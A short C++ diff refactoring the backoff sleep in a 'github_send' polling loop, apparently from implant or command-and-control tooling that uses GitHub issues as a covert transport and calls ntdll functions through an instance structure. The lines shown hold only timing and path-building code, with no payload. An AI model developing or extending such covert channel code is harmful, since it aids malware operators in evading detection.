@@ -316,12 +316,9 @@ auto declfn starburst::github_send(
     uint32_t server_resp_size = 0;
 
     for ( uint32_t attempt = 0; attempt < 60; attempt++ ) {
-        // sleep between polls
-        LARGE_INTEGER delay;
-        uint32_t sleep_ms = 500 + (attempt * 100);
-        if ( sleep_ms > 3000 ) sleep_ms = 3000;
-        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
-        inst.ntdll.NtDelayExecution( FALSE, &delay );
+        uint32_t poll_ms = 500 + (attempt * 100);
+        if ( poll_ms > 3000 ) poll_ms = 3000;
+        SleepMs( poll_ms );
 
         char server_path[512] = { 0 };
         github_build_path( inst, server_path, inst.transport.server_issue, true );
